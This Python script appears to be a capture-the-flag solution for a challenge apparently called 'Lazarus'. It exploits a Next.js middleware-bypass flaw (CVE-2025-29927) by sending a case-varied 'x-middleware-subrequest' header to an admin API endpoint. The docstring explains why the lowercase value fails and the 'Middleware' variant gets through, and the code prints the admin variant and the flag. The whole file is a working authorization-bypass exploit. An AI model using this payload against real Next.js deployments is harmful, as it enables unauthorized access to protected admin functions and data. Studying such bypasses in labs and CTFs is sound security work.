#!/usr/bin/env python3
"""Lazarus — CVE-2025-29927 middleware bypass with a case-folding twist.

Next.js 14.1.0 skips middleware when it sees `x-middleware-subrequest: middleware`
(exact, case-sensitive match). The app's own admin check reads the same header
but compares it case-INsensitively. So the canonical lowercase payload is eaten
by Next before the app sees it, while a case variant like `Middleware` survives
Next untouched AND still folds to "middleware" for the app -> variant=admin.
"""

import requests

BASE = "http://laz.136.82.117.70.nip.io"


def exploit(value):
    r = requests.get(
        f"{BASE}/api/admin/live",
        headers={"x-middleware-subrequest": value},
        timeout=15,
    )
    return r.json()


# Lowercase is the trap: Next intercepts and drops the header -> still "default".
print("lowercase 'middleware':", exploit("middleware").get("variant"))

# Any case variant slips past Next and fools the app's fuzzy check -> "admin".
data = exploit("Middleware")
print("variant:", data["variant"])
print("FLAG:", data["data"]["flag"])
